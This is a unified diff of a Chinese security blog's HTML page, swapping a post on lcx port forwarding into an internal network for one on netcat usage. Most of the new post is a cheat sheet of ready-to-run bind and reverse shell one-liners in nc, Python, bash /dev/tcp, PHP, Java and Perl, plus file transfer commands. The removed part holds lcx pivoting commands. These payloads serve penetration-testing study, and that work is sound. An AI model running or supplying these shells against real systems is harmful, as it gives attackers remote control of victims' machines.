@@ -6,24 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>lcx内网转发端口 | 不知名网络安全选手的博客</title>
+  <title>netcat使用 | 不知名网络安全选手的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="lcx内网转发端口">
+  <meta name="description" content="内网渗透利器netcat的使用记录~">
 <meta property="og:type" content="article">
-<meta property="og:title" content="lcx内网转发端口">
-<meta property="og:url" content="https://yd0ng.github.io/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/index.html">
+<meta property="og:title" content="netcat使用">
+<meta property="og:url" content="https://yd0ng.github.io/2020/08/31/netcat%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="不知名网络安全选手的博客">
-<meta property="og:description" content="lcx内网转发端口">
+<meta property="og:description" content="内网渗透利器netcat的使用记录~">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://yd0ng.github.io/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/1.png">
-<meta property="og:image" content="https://yd0ng.github.io/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/2.png">
-<meta property="og:image" content="https://yd0ng.github.io/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/3.png">
-<meta property="article:published_time" content="2020-07-14T11:26:23.000Z">
-<meta property="article:modified_time" content="2020-08-31T07:22:26.531Z">
+<meta property="article:published_time" content="2020-08-31T07:24:29.000Z">
+<meta property="article:modified_time" content="2020-08-31T07:57:17.808Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://yd0ng.github.io/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/1.png">
   
   
     <link rel="icon" href="/themes/yilia/source/">
@@ -139,45 +135,60 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-lcx内网转发端口" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-netcat使用" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      lcx内网转发端口
+      netcat使用
     </h1>
   
 
         
-        <a href="/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/" class="archive-article-date">
-  	<time datetime="2020-07-14T11:26:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-14</time>
+        <a href="/2020/08/31/netcat%E4%BD%BF%E7%94%A8/" class="archive-article-date">
+  	<time datetime="2020-08-31T07:24:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>lcx内网转发端口</p>
+        <p>内网渗透利器netcat的使用记录~</p>
 <a id="more"></a>
 
-<h1 id="lcx介绍"><a href="#lcx介绍" class="headerlink" title="lcx介绍"></a>lcx介绍</h1><p>别问，问就是内网穿透用的。<br>三个参数</p>
-<ul>
-<li>-listen：监听端口</li>
-<li>-tran：转发端口</li>
-<li>-slave：连接端口</li>
-</ul>
-<h1 id="测试目的"><a href="#测试目的" class="headerlink" title="测试目的"></a>测试目的</h1><p>将内网机器的80端口转发到公网机器的8081端口，其他端口转发一致</p>
-<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内网机器：172.16.191.140</span><br><span class="line">公网机器：xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>netcat，net上的cat，从网络的一段读取数据并发送至网络的另一端，功能包括但不限于banner探测、端口探测、端口监听、文件传输以及反弹shell等。</p>
+<h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><h2 id="功能查询"><a href="#功能查询" class="headerlink" title="功能查询"></a>功能查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -h</span><br></pre></td></tr></table></figure>
+<h2 id="banner探测"><a href="#banner探测" class="headerlink" title="banner探测"></a>banner探测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v ip port</span><br></pre></td></tr></table></figure>
 
-<h1 id="转发过程"><a href="#转发过程" class="headerlink" title="转发过程"></a>转发过程</h1><h2 id="公网机器操作"><a href="#公网机器操作" class="headerlink" title="公网机器操作"></a>公网机器操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 8080 8081</span><br></pre></td></tr></table></figure>
-<p>监听本机的8080和8081端口，8081端口与内网机器建立连接，8080用来攻击者访问</p>
-<p><img src="/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/1.png" alt></p>
-<h2 id="内网机器操作"><a href="#内网机器操作" class="headerlink" title="内网机器操作"></a>内网机器操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave xxx.xxx.xxx.xxx 8081 172.16.191.140 80</span><br></pre></td></tr></table></figure>
-<p>本机的80端口与公网机器的8081端口简历连接</p>
-<p><img src="/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/2.png" alt></p>
-<h2 id="转发成功"><a href="#转发成功" class="headerlink" title="转发成功"></a>转发成功</h2><p>访问公网的8080端口，已成功访问内网机器80端口<br><img src="/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/3.png" alt></p>
+<h2 id="连接主机"><a href="#连接主机" class="headerlink" title="连接主机"></a>连接主机</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip port</span><br></pre></td></tr></table></figure>
+<h2 id="端口扫描-速度慢，不推荐"><a href="#端口扫描-速度慢，不推荐" class="headerlink" title="端口扫描(速度慢，不推荐)"></a>端口扫描(速度慢，不推荐)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -z ip port_range</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口监听"><a href="#端口监听" class="headerlink" title="端口监听"></a>端口监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp port</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp port&gt;filename</span><br><span class="line">nc ip port &lt;filename -q 1</span><br></pre></td></tr></table></figure>
+
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>nc最大的用途便是用来反弹shell，所以这里单独列举</p>
+<h2 id="nc正向shell"><a href="#nc正向shell" class="headerlink" title="nc正向shell"></a>nc正向shell</h2><p>受害机监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp port -e &#x2F;bin&#x2F;sh</span><br><span class="line">nc -lp port -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+<p>攻击机连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip port</span><br></pre></td></tr></table></figure>
+
+<h2 id="nc反向shell"><a href="#nc反向shell" class="headerlink" title="nc反向shell"></a>nc反向shell</h2><p>攻击机监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
+<p>受害机连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc ip port -e &#x2F;bin&#x2F;sh</span><br><span class="line">nc ip port -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="Python反向shell"><a href="#Python反向shell" class="headerlink" title="Python反向shell"></a>Python反向shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Bash反向shell"><a href="#Bash反向shell" class="headerlink" title="Bash反向shell"></a>Bash反向shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP反向shell"><a href="#PHP反向shell" class="headerlink" title="PHP反向shell"></a>PHP反向shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;IP&quot;,PORT);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Java反向shell"><a href="#Java反向shell" class="headerlink" title="Java反向shell"></a>Java反向shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Perl反向shell"><a href="#Perl反向shell" class="headerlink" title="Perl反向shell"></a>Perl反向shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;IP&quot;;$p&#x3D;PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
 
       
       
@@ -281,7 +292,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/07/14/lcx%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/08/31/netcat%E4%BD%BF%E7%94%A8/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -295,18 +306,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/07/16/nmap%E4%B8%8Emasscan%E7%9A%84%E4%BD%BF%E7%94%A8/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          nmap与masscan的使用
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/07/07/CobaltStrike%E5%88%9D%E6%8E%A2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CobaltStrike初探</div>
+    <a href="/2020/08/31/ICMP%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ICMP隧道搭建</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -333,7 +335,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lcx介绍"><span class="toc-number">1.</span> <span class="toc-text">lcx介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#测试目的"><span class="toc-number">2.</span> <span class="toc-text">测试目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境介绍"><span class="toc-number">3.</span> <span class="toc-text">环境介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#转发过程"><span class="toc-number">4.</span> <span class="toc-text">转发过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#公网机器操作"><span class="toc-number">4.1.</span> <span class="toc-text">公网机器操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网机器操作"><span class="toc-number">4.2.</span> <span class="toc-text">内网机器操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#转发成功"><span class="toc-number">4.3.</span> <span class="toc-text">转发成功</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#介绍"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单使用"><span class="toc-number">2.</span> <span class="toc-text">简单使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#功能查询"><span class="toc-number">2.1.</span> <span class="toc-text">功能查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#banner探测"><span class="toc-number">2.2.</span> <span class="toc-text">banner探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#连接主机"><span class="toc-number">2.3.</span> <span class="toc-text">连接主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口扫描-速度慢，不推荐"><span class="toc-number">2.4.</span> <span class="toc-text">端口扫描(速度慢，不推荐)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口监听"><span class="toc-number">2.5.</span> <span class="toc-text">端口监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件传输"><span class="toc-number">2.6.</span> <span class="toc-text">文件传输</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反弹shell"><span class="toc-number">3.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nc正向shell"><span class="toc-number">3.1.</span> <span class="toc-text">nc正向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc反向shell"><span class="toc-number">3.2.</span> <span class="toc-text">nc反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python反向shell"><span class="toc-number">3.3.</span> <span class="toc-text">Python反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash反向shell"><span class="toc-number">3.4.</span> <span class="toc-text">Bash反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP反向shell"><span class="toc-number">3.5.</span> <span class="toc-text">PHP反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java反向shell"><span class="toc-number">3.6.</span> <span class="toc-text">Java反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl反向shell"><span class="toc-number">3.7.</span> <span class="toc-text">Perl反向shell</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
